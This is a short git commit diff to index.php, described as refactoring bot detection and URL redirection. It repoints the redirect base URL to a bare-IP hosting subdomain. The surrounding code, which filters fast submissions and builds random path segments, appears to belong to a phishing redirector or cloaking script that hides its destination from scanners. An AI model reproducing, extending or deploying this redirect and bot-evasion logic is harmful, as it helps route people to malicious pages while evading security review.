ec67dd60916cdd35d977cbcf423598068aefd067
anumumadavum38-ops <anumumadavum38@gmail.com>
2026-04-29 18:18:20 -0300

    Refactor bot detection and URL redirection logic

--- index.php
+++ index.php
@@ -66,7 +66,7 @@ if ($sent_time && (time() - (int)$sent_time) < 3) {
     exit;
 }
 
-$baseUrl = 'https://www.okieweb.com/';
+$baseUrl = 'https://23.177.169.192.host.secureserver.net/';
 
 function generateSegment($length) {
     $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
